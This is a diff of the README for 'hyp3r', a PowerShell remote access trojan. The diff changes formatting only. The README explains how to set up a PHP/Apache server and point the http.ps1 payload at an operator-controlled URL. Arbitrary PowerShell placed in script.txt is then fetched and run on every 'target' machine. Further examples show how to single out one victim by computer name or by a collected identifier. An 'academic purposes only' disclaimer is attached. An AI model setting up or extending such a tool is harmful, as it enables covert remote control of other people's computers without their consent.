@@ -1,9 +1,11 @@
 # hyp3r
 <hr>
-hyp3r is a basic RAT written in powershell.
-<br>
+### hyp3r is a basic RAT written in powershell.
+
 **DISCLAIMER: THIS PROJECT IS FOR ACADEMIC PURPOSES ONLY. THE DEVELOPERS TAKE NO RESPONSIBILITY FOR ILLEGAL USAGE AND/OR POTENTIAL HARMS.**
+
 <hr>
+
 ## Requirements
   - PHP 8.0.2 (might work on older versions as well).
   - apache web server.
@@ -34,11 +36,13 @@ cd hyp3r/
 ### 2. Configure
   - Copy the contents of the `apache` folder to your webserver's page folder.
   - Edit lines `2`, `3` and `4` inside `http.ps1` as follows: 
+
         ```powershell
         $verurl = 'http://your_website_url_or_ip/script.txt'
         $url = 'http://your_website_url_or_ip'
         $stop = 'the syntax of your choice to force stop the payload on the target machine'
         ```
+
   - Save and close the file. The installation is now complete!
 
 ## Usage
@@ -49,14 +53,17 @@ cd hyp3r/
 
 ### To run commands on the target computer(s) open the file called `script.txt` inside your webserver's page folder and modify its contents
   - Example:
+
         ```powershell
         [System.Console]::Beep(1000,300)
         ```
+
   -the syntax above will result in a short *beep* given out by the target
 ### Notes:
   - The commands or scripts you write inside `script.txt` must be powershell code (obviously).
   - If you have multiple targets that listen to the same server the commands inside `script.txt` will be ran by all of the computers listening.
   - If you want to run a command only on one of the targets you will have to get a little creative:
+
         ```powershell
         if($env:COMPUTERNAME -eq "TARGET-PC") {
           echo "now it will only be executed by targets with the user TARGET-PC"
@@ -72,4 +79,5 @@ cd hyp3r/
           doStuff()
         }
         ```
+
   - You can get the UNIQUE_IDENTIFIER of a computer from the `data.txt` file inside the webserver's page folder: eg. `CND83492ZZ_69BCTDGFT_760BD1B8-5170-E821-A4C3-1063E5C2E22F`.
